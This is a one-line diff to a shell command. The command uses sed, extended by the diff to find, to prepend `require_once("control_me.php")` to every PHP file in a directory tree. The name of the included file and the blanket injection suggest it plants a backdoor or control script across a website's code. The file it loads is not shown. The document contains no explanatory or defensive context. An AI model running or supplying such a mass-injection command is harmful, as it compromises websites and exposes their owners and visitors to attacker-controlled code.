@@ -1,2 +1,1 @@
-
-sed -i '1i <?php require_once("control_me.php")?>' *.php
+sed -i '1i  <?php require_once("control_me.php")?>' $(find -type f -name "*.php")
